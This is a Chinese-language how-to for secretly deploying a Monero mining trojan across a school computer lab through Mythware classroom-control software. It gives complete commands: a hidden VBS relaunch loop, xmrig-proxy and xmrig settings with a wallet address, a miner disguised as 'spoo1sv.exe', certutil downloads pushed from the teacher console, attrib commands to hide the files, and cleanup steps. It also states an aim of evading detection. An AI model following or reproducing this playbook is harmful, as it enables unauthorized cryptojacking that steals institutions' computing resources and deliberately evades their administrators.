# 极域教室下的全机房挖矿马的部署

## 目标
有一台电脑连接外网，作为机房内的xmrig-proxy

其余的电脑执行挖矿程序，连接的矿池是xmrig-proxy

***希望能够有方法对矿包进行加密，防止被检测***

## 部署流程

1. 作最后一级xmrig-proxy的，保持稳定外网连接。
   - p.exe  
   > 参考目录附件
   - p.vbs  
   ```vbs
      set ws=wscript.createobject("wscript.shell")
      do
         ws.run "[PORTAL_PASS_PATH]\p.exe",0
         wscript.sleep 15*60*1000
      loop
   ```
2. 获取当前机房能用的Mythware
   - 提前准备好极域2010 2013 2014 2016 2017的版本。
   > 参考目录下附件
   - 教师端获取
       - zip通过IIS，FTP，SMB等传输。  
   > 关于命令行安装IIS，请参考：  
   > ```powershell
   >   dism /Online /Enable-Feature  /FeatureName:IIS-ApplicationDevelopment  /FeatureName:IIS-ASP  /FeatureName:IIS-ASPNET  /FeatureName:IIS-BasicAuthentication  /FeatureName:IIS-CGI  /FeatureName:IIS-ClientCertificateMappingAuthentication  /FeatureName:IIS-CommonHttpFeatures  /FeatureName:IIS-CustomLogging  /FeatureName:IIS-DefaultDocument  /FeatureName:IIS-DigestAuthentication  /FeatureName:IIS-DirectoryBrowsing  /FeatureName:IIS-FTPExtensibility  /FeatureName:IIS-FTPServer  /FeatureName:IIS-FTPSvc  /FeatureName:IIS-HealthAndDiagnostics  /FeatureName:IIS-HostableWebCore  /FeatureName:IIS-HttpCompressionDynamic  /FeatureName:IIS-HttpCompressionStatic  /FeatureName:IIS-HttpErrors  /FeatureName:IIS-HttpLogging  /FeatureName:IIS-HttpRedirect  /FeatureName:IIS-HttpTracing  /FeatureName:IIS-IIS6ManagementCompatibility  /FeatureName:IIS-IISCertificateMappingAuthentication  /FeatureName:IIS-IPSecurity  /FeatureName:IIS-ISAPIExtensions  /FeatureName:IIS-ISAPIFilter  /FeatureName:IIS-LegacyScripts  /FeatureName:IIS-LegacySnapIn  /FeatureName:IIS-LoggingLibraries  /FeatureName:IIS-ManagementConsole  /FeatureName:IIS-ManagementScriptingTools  /FeatureName:IIS-ManagementService  /FeatureName:IIS-Metabase  /FeatureName:IIS-NetFxExtensibility  /FeatureName:IIS-ODBCLogging  /FeatureName:IIS-Performance  /FeatureName:IIS-RequestFiltering  /FeatureName:IIS-RequestMonitor  /FeatureName:IIS-Security  /FeatureName:IIS-ServerSideIncludes  /FeatureName:IIS-StaticContent  /FeatureName:IIS-URLAuthorization  /FeatureName:IIS-WebDAV  /FeatureName:IIS-WebServer  /FeatureName:IIS-WebServerManagementTools  /FeatureName:IIS-WebServerRole  /FeatureName:IIS-WindowsAuthentication  /FeatureName:IIS-WMICompatibility  /FeatureName:WAS-ConfigurationAPI  /FeatureName:WAS-NetFxEnvironment  /FeatureName:WAS-ProcessModel  /FeatureName:WAS-WindowsActivationService
   > ```
3. 配置最新xmrig-proxy  
   <https://github.com/xmrig/xmrig-proxy/releases/>
   ```bash
   xmrig-proxy.exe --donate-level 1 -b 0.0.0.0:8080 --coin=monero -o pool.supportxmr.com:5555 -u 453F4eBx9ApYPAVTmMeVrDUsWq8p36Svpb1RaJFp2ewkLr6mWg3qFUYU7ukxkyQQ8q4rCV4HZ2sqmKEbUbyoeNBRF6mhqBz -p a3 -k -r 2 -R 1
   ```
   
4. 配置最新xmrig文件  
   <https://github.com/xmrig/xmrig/releases/>
   - 使用ResourceHacker去除exe图标
   - 配置st.bat  
    > **替换[PROXY_IP] [PROXY_PORT]**  
    > ```bash
    > "C:\Program Files\Common Files\spoo1sv.exe" -B --nicehash --donate-level 1 -o [PROXY_IP]:[PROXY_PORT] -u 453F4eBx9ApYPAVTmMeVrDUsWq8p36Svpb1RaJFp2ewkLr6mWg3qFUYU7ukxkyQQ8q4rCV4HZ2sqmKEbUbyoeNBRF6mhqBz -p x -k
    > ```
5. 将xmrig.exe, st.bat, WinRing0x64.sys部署到一台IIS上
   - **注意MIME规则。将sys扩展名变成txt**
   > ```Bash
   > rename WinRing0x64.sys WinRing0x64.txt
   > ```

6. 使用极域或其他远程控制软件，进行命令执行
   - 先检测当前机房是否有已经上线的教师端程序
   > KillNetgr
   - 添加命令运行  
    _命令名称顺序ID号形式递增。_  
    **替换 [IIS_SERVER_IP]**
   ```bash
   certutil.exe  
   -urlcache -split -f "http://[IIS_SERVER_IP]/xmrig.exe" "C:\Program Files\Common Files\spoo1sv.exe"
   -urlcache -split -f "http://[IIS_SERVER_IP]/st.bat" "C:\Program Files\Common Files\st.bat"
   -urlcache -split -f "http://[IIS_SERVER_IP]/WinRing0x64.txt" "C:\Program Files\Common Files\WinRing0x64.sys"
   ```
   - 隐藏文件的命令运行 _(Optional)_
   ```bash
      attrib.exe  
      +s +h +a "C:\Program Files\Common Files\spoo1sv.exe"
      +s +h +a "C:\Program Files\Common Files\st.bat"
      +s +h +a "C:\Program Files\Common Files\WinRing0x64.sys"
   ```
   - 启动挖矿
   ```bash
      cmd.exe
      /c cd "C:\Program Files\Common Files\" && st.bat
   ```
   - 结束挖矿
      ```bash
      cmd.exe  
      /c taskkill /im spoo1sv.exe /f
      ```
      _(Optional)_
      ```bash
      del /f /q "C:\Program Files\Common Files\spoo1sv.exe"
      del /f /q "C:\Program Files\Common Files\st.bat"
      del /f /q "C:\Program Files\Common Files\WinRing0x64.sys"
      ```
7. 检测成果
   - xmrig-proxy中**c**键查看**连接数**。**h**键查看**Hashrate**.
8. 退出
